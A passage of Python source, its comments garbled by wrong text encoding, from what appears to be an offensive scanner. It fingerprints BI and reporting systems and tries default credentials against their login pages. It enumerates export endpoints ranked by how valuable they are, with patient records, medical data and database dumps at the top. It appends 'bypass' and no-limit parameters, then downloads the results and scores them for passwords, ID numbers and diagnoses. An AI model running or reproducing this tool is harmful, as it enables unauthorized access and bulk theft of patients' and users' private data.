            'dr_sum': {
                'paths': ['/DrSum/', '/drsum/', '/MotionBoard/'],
                'files': ['DrSum.js', 'drs/', 'pivot/'],
                'params': ['dr_id=', 'connection='],
                'headers': ['x-drsum']
            }
        }
        
        # ä½¿ç”¨ç»Ÿä¸€çš„sessionç®¡ç†ï¼ˆæ”¯æŒè®¤è¯ï¼‰
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            for bi_name, signatures in enhanced_bi_signatures.items():
                print(f"    æ£€æµ‹ {bi_name} BIç³»ç»Ÿ...")
                
                for path in signatures['paths']:
                    url = urljoin(self.target_url, path)
                    self.noise_stats['total_paths_tested'] += 1
                    
                    try:
                        resp = await self._safe_request('GET', url, timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True)
                        if not resp:
                            continue
                            
                        # ä½¿ç”¨withè¯­å¥ç®¡ç†å“åº”
                        async with resp:
                            content = await resp.text() if resp.status == 200 else ""
                            
                            # æ™ºèƒ½å™ªéŸ³æ£€æµ‹
                            is_noise, noise_reason = self.is_noise_response(resp, content)
                            if is_noise:
                                self.noise_stats['noise_filtered'] += 1
                                print(f"       è¿‡æ»¤å™ªéŸ³: {path} ({noise_reason})")
                                continue
                            
                            if resp.status in [200, 401, 403]:
                                # æ£€æŸ¥ç‰¹å¾
                                found_signatures = []
                                confidence_score = 0
                                
                                # æ–‡ä»¶ç‰¹å¾æ£€æŸ¥
                                for sig in signatures.get('files', []):
                                    if sig.lower() in content.lower() or sig.lower() in str(resp.url).lower():
                                        found_signatures.append(sig)
                                        confidence_score += 20
                                
                                # å¤´éƒ¨ç‰¹å¾æ£€æŸ¥
                                for header in signatures.get('headers', []):
                                    if header.lower() in [h.lower() for h in resp.headers.keys()]:
                                        found_signatures.append(f"header:{header}")
                                        confidence_score += 30
                                
                                # å‚æ•°ç‰¹å¾æ£€æŸ¥ï¼ˆåœ¨URLä¸­ï¼‰
                                for param in signatures.get('params', []):
                                    if param.lower() in str(resp.url).lower():
                                        found_signatures.append(f"param:{param}")
                                        confidence_score += 15
                                
                                # å†…å®¹å…³é”®è¯æ£€æŸ¥
                                bi_keywords = {
                                    'pentaho': ['pentaho', 'pdi', 'spoon', 'kettle'],
                                    'jasperreports': ['jaspersoft', 'jasperserver', 'ireport'],
                                    'tableau': ['tableau', 'vizql', 'workbook'],
                                    'powerbi': ['powerbi', 'power bi', 'microsoft.powerbi'],
                                    'qlik': ['qlikview', 'qlik sense', 'qliksense'],
                                    'motionboard': ['motionboard', 'ãƒ¢ãƒ¼ã‚·ãƒ§ãƒ³ãƒœãƒ¼ãƒ‰'],
                                    'yellowfin': ['yellowfin', 'ã‚¤ã‚¨ãƒ­ãƒ¼ãƒ•ã‚£ãƒ³'],
                                    'dr_sum': ['drsum', 'dr.sum', 'ãƒ‡ã‚£ãƒ¼ã‚¢ãƒ¼ãƒ«ã‚µãƒ ']
                                }
                                
                                for keyword in bi_keywords.get(bi_name, []):
                                    if keyword.lower() in content.lower():
                                        confidence_score += 25
                                        found_signatures.append(f"keyword:{keyword}")
                                
                                if found_signatures or resp.status in [401, 403] or confidence_score > 30:
                                    print(f"       å‘ç° {bi_name} BIç³»ç»Ÿ: {url}")
                                    print(f"         ç½®ä¿¡åº¦: {confidence_score}%")
                                    print(f"         ç‰¹å¾: {found_signatures[:3]}")  # åªæ˜¾ç¤ºå‰3ä¸ªç‰¹å¾
                                    
                                    self.noise_stats['valuable_findings'] += 1
                                    self.detected_tech_stack['bi_systems'].append(bi_name)
                                    
                                    bi_info = {
                                        'name': bi_name,
                                        'url': url,
                                        'status': resp.status,
                                        'signatures': found_signatures,
                                        'confidence': confidence_score,
                                        'version': self._extract_version(content, bi_name),
                                        'auth_required': resp.status in [401, 403]
                                    }
                                    
                                    self.bi_systems.append(bi_info)
                                    
                                    # å¦‚æœæ˜¯401/403ï¼Œå¯èƒ½éœ€è¦è®¤è¯
                                    if resp.status in [401, 403]:
                                        print(f"          éœ€è¦è®¤è¯ (çŠ¶æ€: {resp.status})")
                                        await self._test_default_credentials(session, url, bi_name)
                                            
                    except Exception as e:
                        print(f"        è¿æ¥å¤±è´¥: {path} ({str(e)[:50]})")
                        continue

    def _extract_version(self, content, bi_name):
        """æå–BIç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯"""
        version_patterns = {
            'pentaho': [r'pentaho[_\s]*(?:version|v)?[_\s]*([0-9]+\.[0-9]+(?:\.[0-9]+)?)', 
                       r'pdi[_\s]*([0-9]+\.[0-9]+)'],
            'jasperreports': [r'jasperserver[_\s]*([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
                            r'jasperreports[_\s]*([0-9]+\.[0-9]+)'],
            'tableau': [r'tableau[_\s]*(?:version|v)?[_\s]*([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
                       r'"version":"([0-9]+\.[0-9]+[^"]*)"'],
            'powerbi': [r'powerbi[_\s]*(?:version|v)?[_\s]*([0-9]+\.[0-9]+)',
                       r'"version"\s*:\s*"([^"]*)"'],
        }
        
        patterns = version_patterns.get(bi_name, [])
        for pattern in patterns:
            match = re.search(pattern, content, re.I)
            if match:
                return match.group(1)
        return 'unknown'

    async def _test_default_credentials(self, session, url, bi_name):
        """æµ‹è¯•BIç³»ç»Ÿé»˜è®¤å‡­æ®"""
        default_creds = {
            'pentaho': [('admin', 'password'), ('admin', 'admin'), ('demo', 'demo')],
            'jasperreports': [('jasperadmin', 'jasperadmin'), ('admin', 'admin')],
            'tableau': [('admin', 'admin'), ('tableau', 'tableau')],
            'powerbi': [],  # PowerBIé€šå¸¸ä½¿ç”¨OAuth
            'qlik': [('admin', 'admin'), ('qlikview', 'qlikview')],
            'motionboard': [('admin', 'admin'), ('mb_admin', 'mb_admin')],
            'yellowfin': [('admin@yellowfin.com.au', 'test'), ('admin', 'admin')],
            'dr_sum': [('admin', 'admin'), ('drsum', 'drsum')]
        }
        
        creds = default_creds.get(bi_name, [])
        if not creds:
            return
            
        print(f"          æµ‹è¯•é»˜è®¤å‡­æ®...")
        
        for username, password in creds:
            # æ„é€ ç™»å½•URL
            login_urls = [
                f"{url}j_spring_security_check",  # Spring Security
                f"{url}login", 
                f"{url}login.jsp",
                f"{url}logon.jsp",
                f"{url}auth/login",
                f"{url}rest/login"
            ]
            
            for login_url in login_urls:
                try:
                    auth_data = {
                        'j_username': username, 'j_password': password,
                        'username': username, 'password': password,
                        'user': username, 'pass': password
                    }
                    
                    async with session.post(login_url, data=auth_data, timeout=10) as resp:
                        if resp.status in [200, 302] and 'login' not in str(resp.url).lower():
                            print(f"          å‘ç°æœ‰æ•ˆå‡­æ®: {username}:{password}")
                            return username, password
                            
                except Exception:
                    continue
        
        return None

    async def discover_report_endpoints_smart(self):
        """æ™ºèƒ½æŠ¥è¡¨ç«¯ç‚¹å‘ç° - é›†æˆå™ªéŸ³è¿‡æ»¤å’Œæ™ºèƒ½è·¯å¾„"""
        print("[+]  æ™ºèƒ½æŠ¥è¡¨ç«¯ç‚¹å‘ç°...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # ä½¿ç”¨æ™ºèƒ½ç”Ÿæˆçš„è·¯å¾„
            test_paths = self.intelligent_paths
            print(f"    ä½¿ç”¨ {len(test_paths)} ä¸ªæ™ºèƒ½è·¯å¾„")
            
            # æ™ºèƒ½å¹¶å‘æ§åˆ¶
            semaphore = asyncio.Semaphore(10)  # æ§åˆ¶å¹¶å‘æ•°
            tasks = []
            
            # æµ‹è¯•ç›®å½•è·¯å¾„
            for path in test_paths[:50]:  # é™åˆ¶æ•°é‡é¿å…è¿‡åº¦æ‰«æ
                tasks.append(self._check_report_path_smart(session, semaphore, path))
            
            # æµ‹è¯•å…·ä½“æŠ¥è¡¨æ–‡ä»¶
            valuable_files = self._get_prioritized_filenames()
            for path in test_paths[:20]:  # å‡å°‘è·¯å¾„æ•°é‡
                for filename, priority in valuable_files[:15]:  # ä¼˜å…ˆçº§æ’åº
                    for ext in ['.json', '.csv', '.xlsx', '.pdf', '']:
                        full_path = f"{path.rstrip('/')}/{filename}{ext}"
                        tasks.append(self._check_report_path_smart(session, semaphore, full_path))
            
            print(f"    æ‰§è¡Œ {len(tasks)} ä¸ªå¹¶å‘æ£€æµ‹ä»»åŠ¡...")
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # æ”¶é›†æœ‰æ•ˆç«¯ç‚¹ï¼ˆè¿‡æ»¤å¼‚å¸¸å’ŒNoneï¼‰
            valid_endpoints = [r for r in results if r is not None and not isinstance(r, Exception)]
            self.export_endpoints.extend(valid_endpoints)
            
            print(f"     å‘ç° {len(valid_endpoints)} ä¸ªæœ‰æ•ˆæŠ¥è¡¨ç«¯ç‚¹")
            
            # å™ªéŸ³è¿‡æ»¤ç»Ÿè®¡
            if self.noise_stats['total_paths_tested'] > 0:
                noise_ratio = self.noise_stats['noise_filtered'] / self.noise_stats['total_paths_tested']
                if noise_ratio > 0.4:
                    print(f"     å™ªéŸ³è¿‡æ»¤æ•ˆæœ: {self.noise_stats['noise_filtered']}/{self.noise_stats['total_paths_tested']} ({noise_ratio:.1%})")
                    print(f"     æˆåŠŸé¿å…äº†æŠ¥è¡¨å‘ç°'å‚»é€¼å…´å¥‹' - å¤§é‡å™ªéŸ³è¢«è¿‡æ»¤")

    def _get_prioritized_filenames(self):
        """è·å–æŒ‰ä¼˜å…ˆçº§æ’åºçš„æ–‡ä»¶å"""
        files_with_priority = [
            # é«˜ä»·å€¼æ–‡ä»¶ (ä¼˜å…ˆçº§: é«˜)
            ('patients', 90), ('patient_list', 90), ('patient_export', 85),
            ('users', 85), ('user_list', 85), ('all_users', 80),
            ('admin_export', 95), ('full_export', 90), ('complete_export', 85),
            ('database_dump', 95), ('backup', 85), ('dump', 80),
            
            # åŒ»ç–—ç›¸å…³ (ä¼˜å…ˆçº§: ä¸­é«˜)
            ('medical_records', 80), ('health_records', 75), ('appointments', 75),
            ('prescriptions', 70), ('clinic_data', 70),
            
            # è´¢åŠ¡ç›¸å…³ (ä¼˜å…ˆçº§: ä¸­é«˜)  
            ('financial_report', 80), ('billing', 75), ('payments', 70),
            ('revenue', 70), ('accounting', 65),
            
            # ç»Ÿè®¡æŠ¥è¡¨ (ä¼˜å…ˆçº§: ä¸­)
            ('statistics', 60), ('summary', 60), ('dashboard', 55),
            ('monthly_report', 55), ('yearly_report', 55), ('analytics', 50),
            
            # æ—¥æ–‡æ–‡ä»¶ (ä¼˜å…ˆçº§: æ ¹æ®åœ°åŒºè°ƒæ•´)
            ('æ‚£è€…ä¸€è¦§', 90 if self.detected_tech_stack['country'] == 'jp' else 30),
            ('è¨ºç™‚è¨˜éŒ²', 85 if self.detected_tech_stack['country'] == 'jp' else 25),
            ('äºˆç´„ä¸€è¦§', 75 if self.detected_tech_stack['country'] == 'jp' else 20),
            
            # ä¸­æ–‡æ–‡ä»¶ (ä¼˜å…ˆçº§: æ ¹æ®åœ°åŒºè°ƒæ•´)
            ('æ‚£è€…åˆ—è¡¨', 90 if self.detected_tech_stack['country'] == 'cn' else 30),
            ('è¯Šç–—è®°å½•', 85 if self.detected_tech_stack['country'] == 'cn' else 25),
            ('é¢„çº¦åˆ—è¡¨', 75 if self.detected_tech_stack['country'] == 'cn' else 20),
        ]
        
        # æŒ‰ä¼˜å…ˆçº§æ’åº
        return sorted(files_with_priority, key=lambda x: x[1], reverse=True)

    async def _check_report_path_smart(self, session, semaphore, path):
        """æ™ºèƒ½æŠ¥è¡¨è·¯å¾„æ£€æŸ¥ - é›†æˆå™ªéŸ³è¿‡æ»¤"""
        async with semaphore:
            url = urljoin(self.target_url, path)
            self.noise_stats['total_paths_tested'] += 1
            
            try:
                async with session.head(url, timeout=5, allow_redirects=False) as resp:
                    # æ™ºèƒ½å™ªéŸ³æ£€æµ‹
                    is_noise, noise_reason = self.is_noise_response(resp)
                    if is_noise:
                        self.noise_stats['noise_filtered'] += 1
                        return None
                    
                    if resp.status in [200, 401, 403]:
                        content_type = resp.headers.get('Content-Type', '')
                        content_length = int(resp.headers.get('Content-Length', 0))
                        
                        # è®¡ç®—ä»·å€¼è¯„åˆ†
                        value_score = self._calculate_endpoint_value(path, resp.status, content_type, content_length)
                        
                        if value_score > 30:  # ä»·å€¼é˜ˆå€¼
                            endpoint_info = {
                                'url': url,
                                'path': path,
                                'status': resp.status,
                                'content_type': content_type,
                                'size': content_length,
                                'value_score': value_score,
                                'discovered_method': 'intelligent_path'
                            }
                            
                            # å¦‚æœæ˜¯æœ‰æ•°æ®çš„å“åº”ï¼Œè·å–æ›´å¤šä¿¡æ¯
                            if resp.status == 200 and content_length > 500:
                                print(f"       é«˜ä»·å€¼æŠ¥è¡¨: {path} (è¯„åˆ†: {value_score})")
                                
                                # è·å–å†…å®¹è¿›è¡Œè¿›ä¸€æ­¥åˆ†æ
                                async with session.get(url, timeout=15) as get_resp:
                                    # WAFæ¬ºéª—æ£€æµ‹
                                    is_real = await self._validate_response_with_waf(url, get_resp, 'report_data')
                                    if not is_real:
                                        return None  # è·³è¿‡WAFä¼ªé€ çš„å“åº”
                                    
                                    content = await get_resp.read()
                                    endpoint_info['content_analysis'] = await self._analyze_content_advanced(content, content_type, path)
                                
                            elif resp.status in [401, 403]:
                                print(f"       éœ€è®¤è¯çš„æŠ¥è¡¨: {path} (è¯„åˆ†: {value_score})")
                                
                            self.noise_stats['valuable_findings'] += 1
                            return endpoint_info
                            
            except Exception:
                return None
        
        return None

    def _calculate_endpoint_value(self, path, status, content_type, content_length):
        """è®¡ç®—ç«¯ç‚¹ä»·å€¼è¯„åˆ†"""
        score = 0
        
        # çŠ¶æ€ç è¯„åˆ†
        if status == 200:
            score += 40
        elif status in [401, 403]:
            score += 30  # éœ€è¦è®¤è¯çš„å¯èƒ½æœ‰ä»·å€¼
        
        # è·¯å¾„å…³é”®è¯è¯„åˆ†
        high_value_keywords = ['export', 'download', 'backup', 'dump', 'patient', 'user', 'admin']
        medium_value_keywords = ['report', 'statistics', 'data', 'api']
        
        path_lower = path.lower()
        for keyword in high_value_keywords:
            if keyword in path_lower:
                score += 20
        for keyword in medium_value_keywords:
            if keyword in path_lower:
                score += 10
        
        # å†…å®¹ç±»å‹è¯„åˆ†
        if any(ct in content_type.lower() for ct in ['json', 'csv', 'excel', 'xml']):
            score += 15
        elif 'html' in content_type.lower():
            score += 5
        
        # å†…å®¹å¤§å°è¯„åˆ†
        if content_length > 10000:  # 10KBä»¥ä¸Š
            score += 20
        elif content_length > 1000:  # 1KBä»¥ä¸Š
            score += 10
        
        # ç‰¹æ®Šè·¯å¾„åŠ åˆ†
        if any(special in path_lower for special in ['/_', '/.', '/~', '/admin/', '/management/']):
            score += 15
        
        return score

    async def deep_parameter_enumeration(self):
        """æ·±åº¦å‚æ•°æšä¸¾ - æ™ºèƒ½å‚æ•°ç»„åˆç”Ÿæˆ"""
        if not self.export_endpoints:
            return
            
        print("[+]  æ·±åº¦å‚æ•°æšä¸¾...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # é€‰æ‹©æœ€æœ‰å¸Œæœ›çš„ç«¯ç‚¹è¿›è¡Œæ·±åº¦æµ‹è¯•
            high_value_endpoints = [e for e in self.export_endpoints if e.get('value_score', 0) > 50][:5]
            
            for endpoint in high_value_endpoints:
                print(f"     æ·±åº¦æšä¸¾: {endpoint['path']}")
                await self._enumerate_endpoint_parameters(session, endpoint)

    async def _enumerate_endpoint_parameters(self, session, endpoint):
        """æšä¸¾å•ä¸ªç«¯ç‚¹çš„å‚æ•°"""
        base_url = endpoint['url']
        
        # ç”Ÿæˆæ™ºèƒ½å‚æ•°ç»„åˆ
        param_combinations = self._generate_intelligent_parameter_combinations()
        
        for i, params in enumerate(param_combinations[:20]):  # é™åˆ¶æµ‹è¯•æ•°é‡
            # æ„é€ æµ‹è¯•URL
            param_str = '&'.join([f"{k}={v}" for k, v in params.items()])
            test_url = f"{base_url}?{param_str}"
            
            try:
                async with session.get(test_url, timeout=20) as resp:
                    # æ™ºèƒ½å™ªéŸ³æ£€æµ‹
                    is_noise, noise_reason = self.is_noise_response(resp)
                    if is_noise:
                        continue
                    
                    if resp.status == 200:
                        content_length = int(resp.headers.get('Content-Length', 0))
                        content_type = resp.headers.get('Content-Type', '')
                        
                        # æ£€æŸ¥æ˜¯å¦è¿”å›äº†æœ‰ä»·å€¼çš„æ•°æ®
                        if content_length > 2000:  # 2KBä»¥ä¸Š
                            print(f"       å‚æ•°ç»„åˆæœ‰æ•ˆ: {dict(list(params.items())[:3])}...")
                            print(f"         æ•°æ®å¤§å°: {self.format_size(content_length)}")
                            
                            # ä¸‹è½½å¹¶åˆ†æå†…å®¹
                            content = await resp.read()
                            analysis = await self._analyze_content_advanced(content, content_type, endpoint['path'])
                            
                            if analysis.get('has_sensitive_data', False):
                                print(f"         ğŸš¨ å‘ç°æ•æ„Ÿæ•°æ®!")
                                
                                # æ·»åŠ åˆ°å‘ç°åˆ—è¡¨
                                self.found_reports.append({
                                    'endpoint': test_url,
                                    'params': params,
                                    'content_type': content_type,
                                    'size': content_length,
                                    'analysis': analysis,
                                    'discovery_method': 'deep_parameter_enumeration',
                                    'sensitive_level': analysis.get('sensitive_level', 'medium')
                                })
                                
            except Exception:
                continue

    def _generate_intelligent_parameter_combinations(self):
        """ç”Ÿæˆæ™ºèƒ½å‚æ•°ç»„åˆ"""
        combinations = []
        
        # 1. æ—¶é—´èŒƒå›´ç»„åˆï¼ˆåŸºäºå½“å‰æ—¶é—´ï¼‰
        from datetime import datetime, timedelta
        now = datetime.now()
        
        # ç”Ÿæˆå„ç§æ—¶é—´èŒƒå›´
        time_ranges = [
            # å½“å‰å¹´åº¦
            {'start_date': f'{now.year}-01-01', 'end_date': f'{now.year}-12-31'},
            {'date_from': f'{now.year}-01-01', 'date_to': f'{now.year}-12-31'},
            
            # å»å¹´æ•°æ®
            {'start_date': f'{now.year-1}-01-01', 'end_date': f'{now.year-1}-12-31'},
            
            # æœ€è¿‘å‡ ä¸ªæœˆ
            {'start_date': (now - timedelta(days=90)).strftime('%Y-%m-%d'), 'end_date': now.strftime('%Y-%m-%d')},
            
            # æ‰€æœ‰å†å²æ•°æ®
            {'start_date': '2020-01-01', 'end_date': '2030-12-31'},
            {'from': '0', 'to': '9999999999'},  # æ—¶é—´æˆ³æ ¼å¼
        ]
        
        # 2. æ•°æ®ç±»å‹å’Œæ ¼å¼ç»„åˆ
        data_formats = [
            {'format': 'json', 'export': 'true'},
            {'format': 'csv', 'download': 'true'},
            {'format': 'xlsx', 'type': 'excel'},
            {'format': 'xml', 'output': 'xml'},
            {'type': 'all', 'full': 'true'},
            {'complete': 'true', 'no_limit': 'true'},
        ]
        
        # 3. åˆ†é¡µå’Œé™åˆ¶ç»„åˆï¼ˆä½¿ç”¨æ™ºèƒ½é™åˆ¶ï¼‰
        base_limit = self.limit_manager.get_api_limit(self.system_size, 'report')
        pagination_combos = [
            {'limit': str(base_limit * 2), 'offset': '0'},
            {'page_size': str(base_limit), 'page': '1'},
            {'per_page': str(base_limit * 3), 'page_num': '1'},
            {'count': str(base_limit * 5), 'start': '0'},
            {'limit': '999999', 'all': 'true'},  # å°è¯•è·å–æ‰€æœ‰æ•°æ®
        ]
        
        # 4. åŒ»ç–—ç³»ç»Ÿç‰¹å®šå‚æ•°ï¼ˆåŸºäºæ£€æµ‹åˆ°çš„å›½å®¶ï¼‰
        medical_params = []
        if self.detected_tech_stack['country'] == 'jp':
            medical_params = [
                {'department': 'å†…ç§‘', 'type': 'patient'},
                {'éƒ¨é—¨': 'å¤–ç§‘', 'å½¢å¼': 'æ‚£è€…ä¸€è¦§'},
                {'doctor': 'all', 'period': 'æœˆæ¬¡'},
            ]
        elif self.detected_tech_stack['country'] == 'cn':
            medical_params = [
                {'department': 'å†…ç§‘', 'type': 'patient'},
                {'éƒ¨é—¨': 'å¤–ç§‘', 'æ ¼å¼': 'æ‚£è€…åˆ—è¡¨'},
                {'doctor': 'all', 'period': 'æœˆæŠ¥'},
            ]
        else:
            medical_params = [
                {'department': 'internal', 'type': 'patient'},
                {'dept': 'surgery', 'format': 'patient_list'},
                {'doctor': 'all', 'period': 'monthly'},
            ]
        
        # 5. æƒé™ç»•è¿‡å‚æ•°
        bypass_params = [
            {'admin': 'true', 'force': 'true'},
            {'override': 'true', 'bypass': 'true'},
            {'debug': 'true', 'test': 'true'},
            {'internal': 'true', 'system': 'true'},
            {'access_level': 'admin'},
            {'role': 'administrator'},
        ]
        
        # ç»„åˆæ‰€æœ‰å‚æ•°ç±»å‹
        all_param_types = [time_ranges, data_formats, pagination_combos, medical_params, bypass_params]
        
        # ç”Ÿæˆå„ç§ç»„åˆ
        for time_params in time_ranges[:3]:  # é™åˆ¶æ—¶é—´èŒƒå›´æ•°é‡
            for format_params in data_formats[:3]:  # é™åˆ¶æ ¼å¼æ•°é‡
                for page_params in pagination_combos[:2]:  # é™åˆ¶åˆ†é¡µæ•°é‡
                    combo = {}
                    combo.update(time_params)
                    combo.update(format_params)
                    combo.update(page_params)
                    combinations.append(combo)
        
        # æ·»åŠ åŒ»ç–—ç‰¹å®šç»„åˆ
        for medical in medical_params:
            for time_params in time_ranges[:2]:
                combo = {}
                combo.update(time_params)
                combo.update(medical)
                combo.update({'format': 'json'})
                combinations.append(combo)
        
        # æ·»åŠ æƒé™ç»•è¿‡ç»„åˆ
        for bypass in bypass_params:
            combo = {}
            combo.update(bypass)
            combo.update({'format': 'json', 'limit': '1000'})
            combinations.append(combo)
        
        return combinations

    async def _analyze_content_advanced(self, content, content_type, filename):
        """å¢å¼ºå†…å®¹åˆ†æ - æ•æ„Ÿä¿¡æ¯æ£€æµ‹"""
        analysis = {
            'has_data': False,
            'record_count': 0,
            'data_type': 'unknown',
            'sample_data': None,
            'has_sensitive_data': False,
            'sensitive_level': 'low',
            'sensitive_fields': [],
            'data_value_score': 0
        }
        
        try:
            # JSONæ ¼å¼åˆ†æ
            if 'json' in content_type or filename.endswith('.json'):
                data = json.loads(content)
                analysis.update(self._analyze_json_content(data))
                
            # CSVæ ¼å¼åˆ†æ
            elif 'csv' in content_type or filename.endswith('.csv'):
                text = content.decode('utf-8', errors='ignore')
                analysis.update(self._analyze_csv_content(text))
                
            # Excelæ ¼å¼
            elif any(fmt in content_type for fmt in ['excel', 'spreadsheet']) or filename.endswith('.xlsx'):
                analysis.update(self._analyze_excel_content(content))
                
            # XMLæ ¼å¼
            elif 'xml' in content_type or filename.endswith('.xml'):
                text = content.decode('utf-8', errors='ignore')
                analysis.update(self._analyze_xml_content(text))
                
            # PDFæ ¼å¼
            elif 'pdf' in content_type or filename.endswith('.pdf'):
                analysis.update(self._analyze_pdf_content(content))
                
            # å‹ç¼©æ–‡ä»¶
            elif any(fmt in content_type for fmt in ['zip', 'tar', 'gzip']):
                analysis.update(self._analyze_compressed_content(content))
        
        except Exception as e:
            print(f"      å†…å®¹åˆ†æå¤±è´¥: {e}")
        
        return analysis

    def _analyze_json_content(self, data):
        """åˆ†æJSONå†…å®¹"""
        analysis = {'has_data': False, 'record_count': 0, 'data_type': 'json'}
        
        if isinstance(data, list):
            analysis['has_data'] = len(data) > 0
            analysis['record_count'] = len(data)
            analysis['sample_data'] = data[:3]
            
            # æ£€æŸ¥æ•æ„Ÿå­—æ®µ
            if data:
                sensitive_info = self._detect_sensitive_fields(data[0] if isinstance(data[0], dict) else {})
                analysis.update(sensitive_info)
                
        elif isinstance(data, dict):
            # æŸ¥æ‰¾æ•°æ®æ•°ç»„
            data_keys = ['data', 'results', 'records', 'items', 'patients', 'users', 'appointments', 'list']
            for key in data_keys:
                if key in data and isinstance(data[key], list):
                    analysis['has_data'] = len(data[key]) > 0
                    analysis['record_count'] = len(data[key])
                    analysis['sample_data'] = data[key][:3]
                    
                    # æ£€æŸ¥æ•æ„Ÿå­—æ®µ
                    if data[key] and isinstance(data[key][0], dict):
                        sensitive_info = self._detect_sensitive_fields(data[key][0])
                        analysis.update(sensitive_info)
                    break
                    
            # æ£€æŸ¥åˆ†é¡µä¿¡æ¯
            if 'total' in data:
                analysis['total_records'] = data['total']
        
        return analysis

    def _analyze_csv_content(self, text):
        """åˆ†æCSVå†…å®¹"""
        analysis = {'has_data': False, 'record_count': 0, 'data_type': 'csv'}
        
        lines = text.strip().split('\n')
        if len(lines) > 1:
            analysis['has_data'] = True
            analysis['record_count'] = len(lines) - 1
            
            # åˆ†æå­—æ®µ
            headers = [h.strip().strip('"') for h in lines[0].split(',')]
            analysis['fields'] = headers
            
            # æ£€æŸ¥æ•æ„Ÿå­—æ®µ
            sensitive_info = self._detect_sensitive_fields_from_headers(headers)
            analysis.update(sensitive_info)
            
            # åˆ†ææ•°æ®æ ·æœ¬
            if len(lines) > 1:
                sample_row = [v.strip().strip('"') for v in lines[1].split(',')]
                analysis['sample_data'] = dict(zip(headers, sample_row))
        
        return analysis

    def _analyze_excel_content(self, content):
        """åˆ†æExcelå†…å®¹"""
        analysis = {
            'has_data': True,
            'data_type': 'excel',
            'file_size': len(content),
            'record_count': 'unknown'
        }
        
        # Excelæ–‡ä»¶é€šå¸¸å¾ˆå¤§ï¼Œç®€å•åˆ¤æ–­
        if len(content) > 50000:  # 50KBä»¥ä¸Š
            analysis['data_value_score'] = 80
            analysis['has_sensitive_data'] = True
            analysis['sensitive_level'] = 'high'
            
        return analysis

    def _analyze_xml_content(self, text):
        """åˆ†æXMLå†…å®¹"""
        analysis = {'has_data': False, 'record_count': 0, 'data_type': 'xml'}
        
        # è®¡ç®—è®°å½•æ•°
        record_patterns = [r'<(patient|user|record|item|row|entry)[\s>]', r'<(æ‚£è€…|ç”¨æˆ·|è®°å½•)[\s>]']
        total_records = 0
        
        for pattern in record_patterns:
            matches = re.findall(pattern, text, re.I)
            total_records += len(matches)
        
        if total_records > 0:
            analysis['has_data'] = True
            analysis['record_count'] = total_records
            
            # æ£€æŸ¥æ•æ„Ÿä¿¡æ¯
            sensitive_patterns = [
                'password', 'email', 'phone', 'ssn', 'credit', 'bank',
                'å¯†ç ', 'é‚®ç®±', 'ç”µè¯', 'èº«ä»½è¯', 'é“¶è¡Œå¡'
            ]
            
            found_sensitive = []
            for pattern in sensitive_patterns:
                if pattern.lower() in text.lower():
                    found_sensitive.append(pattern)
            
            if found_sensitive:
                analysis['has_sensitive_data'] = True
                analysis['sensitive_fields'] = found_sensitive
                analysis['sensitive_level'] = 'high' if len(found_sensitive) > 2 else 'medium'
        
        return analysis

    def _analyze_pdf_content(self, content):
        """åˆ†æPDFå†…å®¹"""
        return {
            'has_data': True,
            'data_type': 'pdf',
            'file_size': len(content),
            'has_sensitive_data': len(content) > 100000,  # å¤§PDFå¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯
            'sensitive_level': 'medium'
        }

    def _analyze_compressed_content(self, content):
        """åˆ†æå‹ç¼©æ–‡ä»¶å†…å®¹"""
        return {
            'has_data': True,
            'data_type': 'compressed',
            'file_size': len(content),
            'has_sensitive_data': True,  # å‹ç¼©æ–‡ä»¶é€šå¸¸åŒ…å«é‡è¦æ•°æ®
            'sensitive_level': 'high',
            'data_value_score': 90
        }

    def _detect_sensitive_fields(self, record):
        """ä»è®°å½•ä¸­æ£€æµ‹æ•æ„Ÿå­—æ®µ"""
        sensitive_info = {
            'has_sensitive_data': False,
            'sensitive_fields': [],
            'sensitive_level': 'low',
            'data_value_score': 0
        }
        
        if not isinstance(record, dict):
            return sensitive_info
        
        # å®šä¹‰æ•æ„Ÿå­—æ®µæ¨¡å¼
        sensitive_patterns = {
            'high': [
                'password', 'passwd', 'pwd', 'secret', 'token', 'key',
                'ssn', 'social_security', 'credit_card', 'bank_account',
                'å¯†ç ', 'ç§˜é’¥', 'ä»¤ç‰Œ', 'èº«ä»½è¯', 'é“¶è¡Œå¡', 'ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰'
            ],
            'medium': [
                'email', 'phone', 'mobile', 'address', 'birth', 'age',
                'salary', 'income', 'medical', 'diagnosis', 'prescription',
                'é‚®ç®±', 'ç”µè¯', 'æ‰‹æœº', 'åœ°å€', 'å¹´é¾„', 'è¯Šæ–­', 'å¤„æ–¹',
                'ãƒ¡ãƒ¼ãƒ«', 'é›»è©±', 'ä½æ‰€', 'å¹´é½¢', 'è¨ºæ–­'
            ],
            'low': [
                'name', 'firstname', 'lastname', 'username', 'id',
                'å§“å', 'ç”¨æˆ·å', 'ç¼–å·', 'æ°å', 'ãƒ¦ãƒ¼ã‚¶ãƒ¼å'
            ]
        }
        
        found_fields = []
        max_level = 'low'
        
        for field_name in record.keys():
            field_lower = field_name.lower()
            
            # æ£€æŸ¥å„çº§åˆ«æ•æ„Ÿå­—æ®µ
            for level, patterns in sensitive_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in field_lower:
                        found_fields.append(field_name)
                        if level == 'high':
                            max_level = 'high'
                        elif level == 'medium' and max_level != 'high':
                            max_level = 'medium'
                        break
        
        if found_fields:
            sensitive_info['has_sensitive_data'] = True
            sensitive_info['sensitive_fields'] = found_fields
            sensitive_info['sensitive_level'] = max_level
            
            # è®¡ç®—æ•°æ®ä»·å€¼è¯„åˆ†
            if max_level == 'high':
                sensitive_info['data_value_score'] = 90
            elif max_level == 'medium':
                sensitive_info['data_value_score'] = 70
            else:
                sensitive_info['data_value_score'] = 50
        
        return sensitive_info

    def _detect_sensitive_fields_from_headers(self, headers):
